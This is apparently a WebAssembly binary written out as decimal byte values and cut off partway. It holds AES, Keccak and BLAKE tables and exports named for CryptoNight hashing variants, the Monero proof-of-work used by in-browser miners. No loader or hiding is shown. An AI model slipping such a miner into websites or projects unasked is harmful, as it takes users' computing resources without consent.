122,122,233,71,174,174,24,16,8,8,213,111,186,186,136,240,120,120,111,74,37,37,114,92,46,46,36,56,28,28,241,87,166,166,199,115,180,180,81,151,198,198,35,203,232,232,124,161,221,221,156,232,116,116,33,62,31,31,221,150,75,75,220,97,189,189,134,13,139,139,133,15,138,138,144,224,112,112,66,124,62,62,196,113,181,181,170,204,102,102,216,144,72,72,5,6,3,3,1,247,246,246,18,28,14,14,163,194,97,97,95,106,53,53,249,174,87,87,208,105,185,185,145,23,134,134,88,153,193,193,39,58,29,29,185,39,158,158,56,217,225,225,19,235,248,248,179,43,152,152,51,34,17,17,187,210,105,105,112,169,217,217,137,7,142,142,167,51,148,148,182,45,155,155,34,60,30,30,146,21,135,135,32,201,233,233,73,135,206,206,255,170,85,85,120,80,40,40,122,165,223,223,143,3,140,140,248,89,161,161,128,9,137,137,23,26,13,13,218,101,191,191,49,215,230,230,198,132,66,66,184,208,104,104,195,130,65,65,176,41,153,153,119,90,45,45,17,30,15,15,203,123,176,176,252,168,84,84,214,109,187,187,58,44,22,22,99,165,198,99,124,132,248,124,119,153,238,119,123,141,246,123,242,13,255,242,107,189,214,107,111,177,222,111,197,84,145,197,48,80,96,48,1,3,2,1,103,169,206,103,43,125,86,43,254,25,231,254,215,98,181,215,171,230,77,171,118,154,236,118,202,69,143,202,130,157,31,130,201,64,137,201,125,135,250,125,250,21,239,250,89,235,178,89,71,201,142,71,240,11,251,240,173,236,65,173,212,103,179,212,162,253,95,162,175,234,69,175,156,191,35,156,164,247,83,164,114,150,228,114,192,91,155,192,183,194,117,183,253,28,225,253,147,174,61,147,38,106,76,38,54,90,108,54,63,65,126,63,247,2,245,247,204,79,131,204,52,92,104,52,165,244,81,165,229,52,209,229,241,8,249,241,113,147,226,113,216,115,171,216,49,83,98,49,21,63,42,21,4,12,8,4,199,82,149,199,35,101,70,35,195,94,157,195,24,40,48,24,150,161,55,150,5,15,10,5,154,181,47,154,7,9,14,7,18,54,36,18,128,155,27,128,226,61,223,226,235,38,205,235,39,105,78,39,178,205,127,178,117,159,234,117,9,27,18,9,131,158,29,131,44,116,88,44,26,46,52,26,27,45,54,27,110,178,220,110,90,238,180,90,160,251,91,160,82,246,164,82,59,77,118,59,214,97,183,214,179,206,125,179,41,123,82,41,227,62,221,227,47,113,94,47,132,151,19,132,83,245,166,83,209,104,185,209,0,0,0,0,237,44,193,237,32,96,64,32,252,31,227,252,177,200,121,177,91,237,182,91,106,190,212,106,203,70,141,203,190,217,103,190,57,75,114,57,74,222,148,74,76,212,152,76,88,232,176,88,207,74,133,207,208,107,187,208,239,42,197,239,170,229,79,170,251,22,237,251,67,197,134,67,77,215,154,77,51,85,102,51,133,148,17,133,69,207,138,69,249,16,233,249,2,6,4,2,127,129,254,127,80,240,160,80,60,68,120,60,159,186,37,159,168,227,75,168,81,243,162,81,163,254,93,163,64,192,128,64,143,138,5,143,146,173,63,146,157,188,33,157,56,72,112,56,245,4,241,245,188,223,99,188,182,193,119,182,218,117,175,218,33,99,66,33,16,48,32,16,255,26,229,255,243,14,253,243,210,109,191,210,205,76,129,205,12,20,24,12,19,53,38,19,236,47,195,236,95,225,190,95,151,162,53,151,68,204,136,68,23,57,46,23,196,87,147,196,167,242,85,167,126,130,252,126,61,71,122,61,100,172,200,100,93,231,186,93,25,43,50,25,115,149,230,115,96,160,192,96,129,152,25,129,79,209,158,79,220,127,163,220,34,102,68,34,42,126,84,42,144,171,59,144,136,131,11,136,70,202,140,70,238,41,199,238,184,211,107,184,20,60,40,20,222,121,167,222,94,226,188,94,11,29,22,11,219,118,173,219,224,59,219,224,50,86,100,50,58,78,116,58,10,30,20,10,73,219,146,73,6,10,12,6,36,108,72,36,92,228,184,92,194,93,159,194,211,110,189,211,172,239,67,172,98,166,196,98,145,168,57,145,149,164,49,149,228,55,211,228,121,139,242,121,231,50,213,231,200,67,139,200,55,89,110,55,109,183,218,109,141,140,1,141,213,100,177,213,78,210,156,78,169,224,73,169,108,180,216,108,86,250,172,86,244,7,243,244,234,37,207,234,101,175,202,101,122,142,244,122,174,233,71,174,8,24,16,8,186,213,111,186,120,136,240,120,37,111,74,37,46,114,92,46,28,36,56,28,166,241,87,166,180,199,115,180,198,81,151,198,232,35,203,232,221,124,161,221,116,156,232,116,31,33,62,31,75,221,150,75,189,220,97,189,139,134,13,139,138,133,15,138,112,144,224,112,62,66,124,62,181,196,113,181,102,170,204,102,72,216,144,72,3,5,6,3,246,1,247,246,14,18,28,14,97,163,194,97,53,95,106,53,87,249,174,87,185,208,105,185,134,145,23,134,193,88,153,193,29,39,58,29,158,185,39,158,225,56,217,225,248,19,235,248,152,179,43,152,17,51,34,17,105,187,210,105,217,112,169,217,142,137,7,142,148,167,51,148,155,182,45,155,30,34,60,30,135,146,21,135,233,32,201,233,206,73,135,206,85,255,170,85,40,120,80,40,223,122,165,223,140,143,3,140,161,248,89,161,137,128,9,137,13,23,26,13,191,218,101,191,230,49,215,230,66,198,132,66,104,184,208,104,65,195,130,65,153,176,41,153,45,119,90,45,15,17,30,15,176,203,123,176,84,252,168,84,187,214,109,187,22,58,44,22,99,99,165,198,124,124,132,248,119,119,153,238,123,123,141,246,242,242,13,255,107,107,189,214,111,111,177,222,197,197,84,145,48,48,80,96,1,1,3,2,103,103,169,206,43,43,125,86,254,254,25,231,215,215,98,181,171,171,230,77,118,118,154,236,202,202,69,143,130,130,157,31,201,201,64,137,125,125,135,250,250,250,21,239,89,89,235,178,71,71,201,142,240,240,11,251,173,173,236,65,212,212,103,179,162,162,253,95,175,175,234,69,156,156,191,35,164,164,247,83,114,114,150,228,192,192,91,155,183,183,194,117,253,253,28,225,147,147,174,61,38,38,106,76,54,54,90,108,63,63,65,126,247,247,2,245,204,204,79,131,52,52,92,104,165,165,244,81,229,229,52,209,241,241,8,249,113,113,147,226,216,216,115,171,49,49,83,98,21,21,63,42,4,4,12,8,199,199,82,149,35,35,101,70,195,195,94,157,24,24,40,48,150,150,161,55,5,5,15,10,154,154,181,47,7,7,9,14,18,18,54,36,128,128,155,27,226,226,61,223,235,235,38,205,39,39,105,78,178,178,205,127,117,117,159,234,9,9,27,18,131,131,158,29,44,44,116,88,26,26,46,52,27,27,45,54,110,110,178,220,90,90,238,180,160,160,251,91,82,82,246,164,59,59,77,118,214,214,97,183,179,179,206,125,41,41,123,82,227,227,62,221,47,47,113,94,132,132,151,19,83,83,245,166,209,209,104,185,0,0,0,0,237,237,44,193,32,32,96,64,252,252,31,227,177,177,200,121,91,91,237,182,106,106,190,212,203,203,70,141,190,190,217,103,57,57,75,114,74,74,222,148,76,76,212,152,88,88,232,176,207,207,74,133,208,208,107,187,239,239,42,197,170,170,229,79,251,251,22,237,67,67,197,134,77,77,215,154,51,51,85,102,133,133,148,17,69,69,207,138,249,249,16,233,2,2,6,4,127,127,129,254,80,80,240,160,60,60,68,120,159,159,186,37,168,168,227,75,81,81,243,162,163,163,254,93,64,64,192,128,143,143,138,5,146,146,173,63,157,157,188,33,56,56,72,112,245,245,4,241,188,188,223,99,182,182,193,119,218,218,117,175,33,33,99,66,16,16,48,32,255,255,26,229,243,243,14,253,210,210,109,191,205,205,76,129,12,12,20,24,19,19,53,38,236,236,47,195,95,95,225,190,151,151,162,53,68,68,204,136,23,23,57,46,196,196,87,147,167,167,242,85,126,126,130,252,61,61,71,122,100,100,172,200,93,93,231,186,25,25,43,50,115,115,149,230,96,96,160,192,129,129,152,25,79,79,209,158,220,220,127,163,34,34,102,68,42,42,126,84,144,144,171,59,136,136,131,11,70,70,202,140,238,238,41,199,184,184,211,107,20,20,60,40,222,222,121,167,94,94,226,188,11,11,29,22,219,219,118,173,224,224,59,219,50,50,86,100,58,58,78,116,10,10,30,20,73,73,219,146,6,6,10,12,36,36,108,72,92,92,228,184,194,194,93,159,211,211,110,189,172,172,239,67,98,98,166,196,145,145,168,57,149,149,164,49,228,228,55,211,121,121,139,242,231,231,50,213,200,200,67,139,55,55,89,110,109,109,183,218,141,141,140,1,213,213,100,177,78,78,210,156,169,169,224,73,108,108,180,216,86,86,250,172,244,244,7,243,234,234,37,207,101,101,175,202,122,122,142,244,174,174,233,71,8,8,24,16,186,186,213,111,120,120,136,240,37,37,111,74,46,46,114,92,28,28,36,56,166,166,241,87,180,180,199,115,198,198,81,151,232,232,35,203,221,221,124,161,116,116,156,232,31,31,33,62,75,75,221,150,189,189,220,97,139,139,134,13,138,138,133,15,112,112,144,224,62,62,66,124,181,181,196,113,102,102,170,204,72,72,216,144,3,3,5,6,246,246,1,247,14,14,18,28,97,97,163,194,53,53,95,106,87,87,249,174,185,185,208,105,134,134,145,23,193,193,88,153,29,29,39,58,158,158,185,39,225,225,56,217,248,248,19,235,152,152,179,43,17,17,51,34,105,105,187,210,217,217,112,169,142,142,137,7,148,148,167,51,155,155,182,45,30,30,34,60,135,135,146,21,233,233,32,201,206,206,73,135,85,85,255,170,40,40,120,80,223,223,122,165,140,140,143,3,161,161,248,89,137,137,128,9,13,13,23,26,191,191,218,101,230,230,49,215,66,66,198,132,104,104,184,208,65,65,195,130,153,153,176,41,45,45,119,90,15,15,17,30,176,176,203,123,84,84,252,168,187,187,214,109,22,22,58,44,1,0,0,0,0,0,0,0,130,128,0,0,0,0,0,0,138,128,0,0,0,0,0,128,0,128,0,128,0,0,0,128,139,128,0,0,0,0,0,0,1,0,0,128,0,0,0,0,129,128,0,128,0,0,0,128,9,128,0,0,0,0,0,128,138,0,0,0,0,0,0,0,136,0,0,0,0,0,0,0,9,128,0,128,0,0,0,0,10,0,0,128,0,0,0,0,139,128,0,128,0,0,0,0,139,0,0,0,0,0,0,128,137,128,0,0,0,0,0,128,3,128,0,0,0,0,0,128,2,128,0,0,0,0,0,128,128,0,0,0,0,0,0,128,10,128,0,0,0,0,0,0,10,0,0,128,0,0,0,128,129,128,0,128,0,0,0,128,128,128,0,0,0,0,0,128,1,0,0,128,0,0,0,0,8,128,0,128,0,0,0,128,19,62,219,47,161,68,208,204,235,169,121,26,48,144,53,232,111,110,129,79,97,160,174,85,219,148,155,174,164,103,39,42,131,118,221,116,94,2,6,236,81,98,116,196,205,54,164,231,133,209,58,57,249,186,111,195,19,252,237,51,24,186,237,62,1,0,0,0,2,0,0,0,3,0,0,0,4,0,0,0,136,106,63,36,211,8,163,133,46,138,25,19,68,115,112,3,34,56,9,164,208,49,159,41,152,250,46,8,137,108,78,236,230,33,40,69,119,19,208,56,207,102,84,190,108,12,233,52,183,41,172,192,221,80,124,201,181,213,132,63,23,9,71,181,198,50,244,165,244,151,165,198,248,111,151,132,151,235,132,248,238,94,176,153,176,199,153,238,246,122,140,141,140,247,141,246,255,232,23,13,23,229,13,255,214,10,220,189,220,183,189,214,222,22,200,177,200,167,177,222,145,109,252,84,252,57,84,145,96,144,240,80,240,192,80,96,2,7,5,3,5,4,3,2,206,46,224,169,224,135,169,206,86,209,135,125,135,172,125,86,231,204,43,25,43,213,25,231,181,19,166,98,166,113,98,181,77,124,49,230,49,154,230,77,236,89,181,154,181,195,154,236,143,64,207,69,207,5,69,143,31,163,188,157,188,62,157,31,137,73,192,64,192,9,64,137,250,104,146,135,146,239,135,250,239,208,63,21,63,197,21,239,178,148,38,235,38,127,235,178,142,206,64,201,64,7,201,142,251,230,29,11,29,237,11,251,65,110,47,236,47,130,236,65,179,26,169,103,169,125,103,179,95,67,28,253,28,190,253,95,69,96,37,234,37,138,234,69,35,249,218,191,218,70,191,35,83,81,2,247,2,166,247,83,228,69,161,150,161,211,150,228,155,118,237,91,237,45,91,155,117,40,93,194,93,234,194,117,225,197,36,28,36,217,28,225,61,212,233,174,233,122,174,61,76,242,190,106,190,152,106,76,108,130,238,90,238,216,90,108,126,189,195,65,195,252,65,126,245,243,6,2,6,241,2,245,131,82,209,79,209,29,79,131,104,140,228,92,228,208,92,104,81,86,7,244,7,162,244,81,209,141,92,52,92,185,52,209,249,225,24,8,24,233,8,249,226,76,174,147,174,223,147,226,171,62,149,115,149,77,115,171,98,151,245,83,245,196,83,98,42,107,65,63,65,84,63,42,8,28,20,12,20,16,12,8,149,99,246,82,246,49,82,149,70,233,175,101,175,140,101,70,157,127,226,94,226,33,94,157,48,72,120,40,120,96,40,48,55,207,248,161,248,110,161,55,10,27,17,15,17,20,15,10,47,235,196,181,196,94,181,47,14,21,27,9,27,28,9,14,36,126,90,54,90,72,54,36,27,173,182,155,182,54,155,27,223,152,71,61,71,165,61,223,205,167,106,38,106,129,38,205,78,245,187,105,187,156,105,78,127,51,76,205,76,254,205,127,234,80,186,159,186,207,159,234,18,63,45,27,45,36,27,18,29,164,185,158,185,58,158,29,88,196,156,116,156,176,116,88,52,70,114,46,114,104,46,52,54,65,119,45,119,108,45,54,220,17,205,178,205,163,178,220,180,157,41,238,41,115,238,180,91,77,22,251,22,182,251,91,164,165,1,246,1,83,246,164,118,161,215,77,215,236,77,118,183,20,163,97,163,117,97,183,125,52,73,206,73,250,206,125,82,223,141,123,141,164,123,82,221,159,66,62,66,161,62,221,94,205,147,113,147,188,113,94,19,177,162,151,162,38,151,19,166,162,4,245,4,87,245,166,185,1,184,104,184,105,104,185,0,65,232,47,11,137,14,193,181,116,44,116,153,44,193,64,224,160,96,160,128,96,64,227,194,33,31,33,221,31,227,121,58,67,200,67,242,200,121,182,154,44,237,44,119,237,182,212,13,217,190,217,179,190,212,141,71,202,70,202,1,70,141,103,23,112,217,112,206,217,103,114,175,221,75,221,228,75,114,148,237,121,222,121,51,222,148,152,255,103,212,103,43,212,152,176,147,35,232,35,123,232,176,133,91,222,74,222,17,74,133,187,6,189,107,189,109,107,187,197,187,126,42,126,145,42,197,79,123,52,229,52,158,229,79,237,215,58,22,58,193,22,237,134,210,84,197,84,23,197,134,154,248,98,215,98,47,215,154,102,153,255,85,255,204,85,102,17,182,167,148,167,34,148,17,138,192,74,207,74,15,207,138,233,217,48,16,48,201,16,233,4,14,10,6,10,8,6,4,254,102,152,129,152,231,129,254,160,171,11,240,11,91,240,160,120,180,204,68,204,240,68,120,37,240,213,186,213,74,186,37,75,117,62,227,62,150,227,75,162,172,14,243,14,95,243,162,93,68,25,254,25,186,254,93,128,219,91,192,91,27,192,128,5,128,133,138,133,10,138,5,63,211,236,173,236,126,173,63,33,254,223,188,223,66,188,33,112,168,216,72,216,224,72,112,241,253,12,4,12,249,4,241,99,25,122,223,122,198,223,99,119,47,88,193,88,238,193,119,175,48,159,117,159,69,117,175,66,231,165,99,165,132,99,66,32,112,80,48,80,64,48,32,229,203,46,26,46,209,26,229,253,239,18,14,18,225,14,253,191,8,183,109,183,101,109,191,129,85,212,76,212,25,76,129,24,36,60,20,60,48,20,24,38,121,95,53,95,76,53,38,195,178,113,47,113,157,47,195,190,134,56,225,56,103,225,190,53,200,253,162,253,106,162,53,136,199,79,204,79,11,204,136,46,101,75,57,75,92,57,46,147,106,249,87,249,61,87,147,85,88,13,242,13,170,242,85,252,97,157,130,157,227,130,252,122,179,201,71,201,244,71,122,200,39,239,172,239,139,172,200,186,136,50,231,50,111,231,186,50,79,125,43,125,100,43,50,230,66,164,149,164,215,149,230,192,59,251,160,251,155,160,192,25,170,179,152,179,50,152,25,158,246,104,209,104,39,209,158,163,34,129,127,129,93,127,163,68,238,170,102,170,136,102,68,84,214,130,126,130,168,126,84,59,221,230,171,230,118,171,59,11,149,158,131,158,22,131,11,140,201,69,202,69,3,202,140,199,188,123,41,123,149,41,199,107,5,110,211,110,214,211,107,40,108,68,60,68,80,60,40,167,44,139,121,139,85,121,167,188,129,61,226,61,99,226,188,22,49,39,29,39,44,29,22,173,55,154,118,154,65,118,173,219,150,77,59,77,173,59,219,100,158,250,86,250,200,86,100,116,166,210,78,210,232,78,116,20,54,34,30,34,40,30,20,146,228,118,219,118,63,219,146,12,18,30,10,30,24,10,12,72,252,180,108,180,144,108,72,184,143,55,228,55,107,228,184,159,120,231,93,231,37,93,159,189,15,178,110,178,97,110,189,67,105,42,239,42,134,239,67,196,53,241,166,241,147,166,196,57,218,227,168,227,114,168,57,49,198,247,164,247,98,164,49,211,138,89,55,89,189,55,211,242,116,134,139,134,255,139,242,213,131,86,50,86,177,50,213,139,78,197,67,197,13,67,139,110,133,235,89,235,220,89,110,218,24,194,183,194,175,183,218,1,142,143,140,143,2,140,1,177,29,172,100,172,121,100,177,156,241,109,210,109,35,210,156,73,114,59,224,59,146,224,73,216,31,199,180,199,171,180,216,172,185,21,250,21,67,250,172,243,250,9,7,9,253,7,243,207,160,111,37,111,133,37,207,202,32,234,175,234,143,175,202,244,125,137,142,137,243,142,244,71,103,32,233,32,142,233,71,16,56,40,24,40,32,24,16,111,11,100,213,100,222,213,111,240,115,131,136,131,251,136,240,74,251,177,111,177,148,111,74,92,202,150,114,150,184,114,92,56,84,108,36,108,112,36,56,87,95,8,241,8,174,241,87,115,33,82,199,82,230,199,115,151,100,243,81,243,53,81,151,203,174,101,35,101,141,35,203,161,37,132,124,132,89,124,161,232,87,191,156,191,203,156,232,62,93,99,33,99,124,33,62,150,234,124,221,124,55,221,150,97,30,127,220,127,194,220,97,13,156,145,134,145,26,134,13,15,155,148,133,148,30,133,15,224,75,171,144,171,219,144,224,124,186,198,66,198,248,66,124,113,38,87,196,87,226,196,113,204,41,229,170,229,131,170,204,144,227,115,216,115,59,216,144,6,9,15,5,15,12,5,6,247,244,3,1,3,245,1,247,28,42,54,18,54,56,18,28,194,60,254,163,254,159,163,194,106,139,225,95,225,212,95,106,174,190,16,249,16,71,249,174,105,2,107,208,107,210,208,105,23,191,168,145,168,46,145,23,153,113,232,88,232,41,88,153,58,83,105,39,105,116,39,58,39,247,208,185,208,78,185,39,217,145,72,56,72,169,56,217,235,222,53,19,53,205,19,235,43,229,206,179,206,86,179,43,34,119,85,51,85,68,51,34,210,4,214,187,214,191,187,210,169,57,144,112,144,73,112,169,7,135,128,137,128,14,137,7,51,193,242,167,242,102,167,51,45,236,193,182,193,90,182,45,60,90,102,34,102,120,34,60,21,184,173,146,173,42,146,21,201,169,96,32,96,137,32,201,135,92,219,73,219,21,73,135,170,176,26,255,26,79,255,170,80,216,136,120,136,160,120,80,165,43,142,122,142,81,122,165,3,137,138,143,138,6,143,3,89,74,19,248,19,178,248,89,9,146,155,128,155,18,128,9,26,35,57,23,57,52,23,26,101,16,117,218,117,202,218,101,215,132,83,49,83,181,49,215,132,213,81,198,81,19,198,132,208,3,211,184,211,187,184,208,130,220,94,195,94,31,195,130,41,226,203,176,203,82,176,41,90,195,153,119,153,180,119,90,30,45,51,17,51,60,17,30,123,61,70,203,70,246,203,123,168,183,31,252,31,75,252,168,109,12,97,214,97,218,214,109,44,98,78,58,78,88,58,44,1,0,0,0,3,0,0,0,6,0,0,0,10,0,0,0,15,0,0,0,21,0,0,0,28,0,0,0,36,0,0,0,45,0,0,0,55,0,0,0,2,0,0,0,14,0,0,0,27,0,0,0,41,0,0,0,56,0,0,0,8,0,0,0,25,0,0,0,43,0,0,0,62,0,0,0,18,0,0,0,39,0,0,0,61,0,0,0,20,0,0,0,44,0,0,0,10,0,0,0,7,0,0,0,11,0,0,0,17,0,0,0,18,0,0,0,3,0,0,0,5,0,0,0,16,0,0,0,8,0,0,0,21,0,0,0,24,0,0,0,4,0,0,0,15,0,0,0,23,0,0,0,19,0,0,0,13,0,0,0,12,0,0,0,2,0,0,0,20,0,0,0,14,0,0,0,22,0,0,0,9,0,0,0,6,0,0,0,1,0,0,0,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,14,10,4,8,9,15,13,6,1,12,0,2,11,7,5,3,11,8,12,0,5,2,15,13,10,14,3,6,7,1,9,4,7,9,3,1,13,12,11,14,2,6,5,10,4,0,15,8,9,0,5,7,2,4,10,15,14,1,11,12,6,8,3,13,2,12,6,10,0,11,8,3,4,13,7,5,15,14,1,9,12,5,1,15,14,13,4,10,0,7,6,3,9,2,8,11,13,11,7,14,12,1,3,9,5,0,15,4,8,6,2,10,6,15,14,9,11,3,0,8,12,2,13,7,1,4,10,5,10,2,8,4,7,6,1,5,15,11,9,14,3,12,13,0,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,14,10,4,8,9,15,13,6,1,12,0,2,11,7,5,3,11,8,12,0,5,2,15,13,10,14,3,6,7,1,9,4,7,9,3,1,13,12,11,14,2,6,5,10,4,0,15,8,128,0,65,176,62,11,202,13,235,152,163,65,44,32,211,235,146,205,190,123,156,178,69,193,28,147,81,145,96,212,199,250,38,0,130,214,126,80,138,3,164,35,158,38,119,38,185,69,224,251,26,72,212,26,148,119,205,181,171,38,2,107,23,122,86,240,36,66,15,255,47,168,113,163,150,137,127,46,77,117,29,20,73,8,247,125,226,98,39,118,149,247,118,36,143,148,135,213,182,87,71,128,41,108,92,94,39,45,172,142,13,108,81,132,80,198,87,5,122,15,123,228,211,103,112,36,18,234,137,227,171,19,211,28,215,105,114,213,222,162,223,21,248,103,123,132,21,10,183,35,21,87,129,171,214,144,77,90,135,246,78,159,79,197,195,209,43,64,234,152,58,224,92,69,250,156,3,197,210,153,102,178,153,154,102,2,150,180,242,187,83,138,181,86,20,26,136,219,162,49,3,163,90,92,154,25,14,219,64,63,178,10,135,193,68,16,28,5,25,128,132,158,149,29,111,51,235,173,94,231,205,220,16,186,19,146,2,191,107,65,220,120,101,21,247,187,39,208,10,44,129,57,55,170,120,80,63,26,191,210,65,0,145,211,66,45,90,13,246,204,126,144,221,98,159,156,146,192,151,206,24,92,167,11,199,43,68,172,209,223,101,214,99,198,252,35,151,110,108,3,158,224,184,26,33,5,69,126,68,108,236,168,238,241,3,187,93,142,97,250,253,150,151,178,148,131,129,151,74,142,133,55,219,3,48,47,42,103,141,45,251,159,106,149,138,254,115,129,248,184,105,108,138,199,114,70,192,127,66,20,197,244,21,143,189,199,94,196,117,68,111,167,143,17,187,128,82,222,117,183,174,228,136,188,130,184,0,30,152,166,163,244,142,244,143,51,169,163,99,21,170,95,86,36,213,183,249,137,182,241,237,32,124,90,224,253,54,202,233,90,6,66,44,54,206,41,53,67,78,254,152,61,83,58,249,116,115,154,75,167,208,245,31,89,111,78,129,134,14,157,173,129,175,216,90,159,167,5,6,103,238,52,98,106,139,11,40,190,110,185,23,39,71,116,7,38,198,128,16,63,224,160,126,111,198,126,72,123,13,85,10,165,74,248,164,192,145,227,231,159,151,142,241,158,134,118,114,129,80,96,141,212,126,158,90,65,243,229,176,98,252,159,31,236,64,84,32,122,227,228,26,0,206,244,201,132,79,215,148,245,157,250,149,216,85,46,126,17,36,195,84,165,91,223,114,40,189,254,110,40,120,245,127,226,15,165,196,178,5,137,124,239,238,73,211,46,68,126,147,133,235,40,89,127,112,95,105,55,179,36,49,74,94,134,40,241,29,214,228,101,199,27,119,4,81,185,32,231,116,254,67,232,35,212,135,138,125,41,232,163,146,118,148,242,221,203,122,9,155,48,217,193,29,27,48,251,91,220,27,224,218,36,73,79,242,156,130,191,164,231,186,49,180,112,191,255,13,50,68,5,222,248,188,72,59,174,252,50,83,187,211,57,69,159,195,193,224,41,139,160,229,201,5,253,247,174,9,15,148,112,52,18,66,144,241,52,162,113,183,1,227,68,237,149,233,59,142,54,79,47,152,74,136,64,29,99,160,108,246,21,71,193,68,75,135,82,175,255,126,187,74,241,226,10,198,48,70,112,182,197,204,110,140,230,164,213,164,86,189,79,202,0,218,157,132,75,200,62,24,174,115,87,206,69,48,100,209,173,232,166,206,104,20,92,37,103,163,218,140,242,203,14,225,22,51,233,6,88,154,148,153,154,31,96,178,32,194,111,132,123,209,206,172,127,160,209,133,24,50,89,91,161,141,221,25,211,80,154,28,192,170,165,180,70,159,61,99,103,228,4,107,186,246,202,25,171,11,86,238,126,31,177,121,234,169,40,33,116,233,189,247,53,59,54,81,238,29,87,172,90,117,80,211,118,58,70,194,254,163,125,112,1,247,53,193,175,152,164,216,66,120,237,236,32,158,107,103,121,65,131,99,21,234,58,219,168,250,195,59,77,50,131,44,131,167,64,59,31,28,39,71,243,89,64,240,52,183,45,118,154,231,62,78,108,210,33,79,253,184,253,141,57,220,87,89,239,141,155,12,73,43,73,235,218,91,162,215,73,104,243,112,13,125,59,174,208,122,141,85,132,245,165,233,240,228,248,142,101,160,184,162,244,54,16,59,83,12,168,7,158,117,62,236,90,145,104,148,146,86,232,136,79,91,176,92,85,248,186,188,76,227,187,59,153,243,135,148,123,117,218,244,214,114,107,28,93,100,174,172,40,220,52,179,109,108,52,165,80,184,40,219,113,248,97,226,242,16,141,81,42,227,219,100,51,89,221,117,252,28,172,188,241,67,206,63,162,103,187,209,60,2,232,67,176,51,10,91,202,136,41,161,117,127,52,25,77,180,22,83,92,146,59,148,195,14,121,77,30,121,116,117,215,182,238,175,63,234,168,212,247,190,26,57,33,92,244,126,9,76,35,39,81,38,163,36,83,186,50,60,210,68,163,23,74,109,166,213,173,181,29,62,166,175,242,201,8,131,89,61,152,145,107,60,86,76,248,124,161,114,134,96,77,70,226,62,204,8,110,199,246,47,152,51,179,177,188,118,94,43,214,102,165,239,196,230,42,6,244,182,232,190,193,212,54,116,238,130,21,188,239,33,99,253,193,78,13,244,83,201,105,167,125,90,196,6,88,88,38,126,193,20,22,6,224,250,22,126,144,175,61,40,99,157,63,210,201,242,227,0,155,210,12,95,170,206,48,183,212,12,48,116,42,81,22,242,224,50,152,13,235,48,216,227,206,248,154,75,197,158,123,181,241,121,146,255,81,230,110,4,134,104,211,155,35,77,87,230,150,103,49,204,230,166,243,23,10,117,5,177,118,129,217,19,50,108,206,60,23,82,132,248,5,162,98,244,43,203,179,120,71,21,71,255,70,84,130,35,147,106,72,56,223,88,7,78,94,101,101,242,252,124,137,252,134,80,142,49,112,46,68,208,11,202,134,240,64,9,162,48,120,71,78,101,160,238,57,209,247,56,131,247,94,233,55,228,44,58,189,33,151,178,38,1,19,248,111,163,68,237,209,239,159,222,231,139,160,223,21,118,37,146,217,60,133,247,246,18,220,66,190,216,167,236,124,171,39,176,126,83,141,125,218,170,62,168,222,170,37,206,147,189,2,105,216,90,246,67,253,26,115,8,249,192,95,239,218,23,74,25,165,151,77,102,51,76,253,33,106,53,180,152,49,219,65,21,112,234,30,15,187,237,205,84,155,154,208,99,161,81,151,64,114,246,117,157,191,145,71,111,226,99,124,119,123,242,107,111,197,48,1,103,43,254,215,171,118,202,130,201,125,250,89,71,240,173,212,162,175,156,164,114,192,183,253,147,38,54,63,247,204,52,165,229,241,113,216,49,21,4,199,35,195,24,150,5,154,7,18,128,226,235,39,178,117,9,131,44,26,27,110,90,160,82,59,214,179,41,227,47,132,83,209,0,237,32,252,177,91,106,203,190,57,74,76,88,207,208,239,170,251,67,77,51,133,69,249,2,127,80,60,159,168,81,163,64,143,146,157,56,245,188,182,218,33,16,255,243,210,205,12,19,236,95,151,68,23,196,167,126,61,100,93,25,115,96,129,79,220,34,42,144,136,70,238,184,20,222,94,11,219,224,50,58,10,73,6,36,92,194,211,172,98,145,149,228,121,231,200,55,109,141,213,78,169,108,86,244,234,101,122,174,8,186,120,37,46,28,166,180,198,232,221,116,31,75,189,139,138,112,62,181,102,72,3,246,14,97,53,87,185,134,193,29,158,225,248,152,17,105,217,142,148,155,30,135,233,206,85,40,223,140,161,137,13,191,230,66,104,65,153,45,15,176,84,187,22,1,2,4,8,16,32,64,128,27,54,0,137,31,4,110,97,109,101,1,192,3,39,0,9,101,110,118,46,97,98,111,114,116,1,17,101,110,118,46,101,110,108,97,114,103,101,77,101,109,111,114,121,2,18,101,110,118,46,103,101,116,84,111,116,97,108,77,101,109,111,114,121,3,27,101,110,118,46,97,98,111,114,116,79,110,67,97,110,110,111,116,71,114,111,119,77,101,109,111,114,121,4,15,101,110,118,46,95,95,95,115,101,116,69,114,114,78,111,5,16,101,110,118,46,95,95,95,115,121,115,99,97,108,108,50,48,6,26,101,110,118,46,95,101,109,115,99,114,105,112,116,101,110,95,109,101,109,99,112,121,95,98,105,103,7,10,101,110,118,46,95,102,116,105,109,101,8,11,101,110,118,46,95,103,109,116,105,109,101,9,2,102,57,10,3,102,49,48,11,3,102,49,49,12,3,102,49,50,13,3,102,49,51,14,3,102,49,52,15,3,102,49,53,16,7,95,109,97,108,108,111,99,17,3,102,49,55,18,3,102,49,56,19,3,102,49,57,20,18,95,97,101,115,98,95,115,105,110,103,108,101,95,114,111,117,110,100,21,3,102,50,49,22,3,102,50,50,23,3,102,50,51,24,3,102,50,52,25,3,102,50,53,26,3,102,50,54,27,3,102,50,55,28,20,95,99,114,121,112,116,111,110,105,103,104,116,95,100,101,115,116,114,111,121,29,19,95,99,114,121,112,116,111,110,105,103,104,116,95,99,114,101,97,116,101,30,3,102,51,48,31,3,102,51,49,32,3,102,51,50,33,3,102,51,51,34,3,102,51,52,35,27,95,99,114,121,112,116,111,110,105,103,104,116,95,104,97,115,104,95,118,97,114,105,97,110,116,95,50,36,27,95,99,114,121,112,116,111,110,105,103,104,116,95,104,97,115,104,95,118,97,114,105,97,110,116,95,49,37,27,95,99,114,121,112,116,111,110,105,103,104,116,95,104,97,115,104,95,118,97,114,105,97,110,116,95,48,38,10,115,116,97,99,107,65,108,108,111,99,2,190,27,39,0,1,0,0,1,0,2,0,3,0,4,1,0,0,5,2,0,0,1,0,6,3,0,0,1,0,2,0,7,1,0,0,8,1,0,0,9,12,0,2,112,48,1,2,112,49,2,2,108,48,3,2,108,49,4,2,108,50,5,2,108,51,6,2,108,52,7,2,108,53,8,2,108,54,9,2,108,55,10,2,108,56,11,2,108,57,10,24,0,2,112,48,1,2,112,49,2,2,112,50,3,2,108,48,4,2,108,49,5,2,108,50,6,2,108,51,7,2,108,52,8,2,108,53,9,2,108,54,10,2,108,55,11,2,108,56,12,2,108,57,13,3,108,49,48,14,3,108,49,49,15,3,108,49,50,16,3,108,49,51,17,3,108,49,52,18,3,108,49,53,19,3,108,49,54,20,3,108,